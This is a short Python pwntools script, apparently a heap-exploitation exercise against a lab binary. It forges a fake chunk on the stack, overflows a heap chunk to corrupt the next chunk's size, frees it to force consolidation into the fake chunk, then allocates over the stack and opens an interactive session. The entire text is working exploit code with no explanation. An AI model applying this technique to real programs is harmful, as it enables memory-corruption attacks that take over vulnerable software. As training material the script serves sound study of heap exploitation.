from pwn import *
from handle import *

def exploit():
	malloc(0x100)
	malloc(0xf0)

	fake_chunk = stack_var_1_address()
	B = chunk_info(1)
	fake_size = (B[0] - 0x10 - fake_chunk) & 0xFFFFFFFFFFFFFFFF
	write_to_stack_var_1(p64(0x400) + p64(fake_size) + p64(fake_chunk) + p64(fake_chunk) + p64(fake_chunk) + p64(fake_chunk))

	write_to_chunk(0, 'A' * 0x100 + p64(fake_size))

	free_chunk(1)

	malloc(0x140)

p = exec_file(1)
exploit()
p.interactive()
p.close()
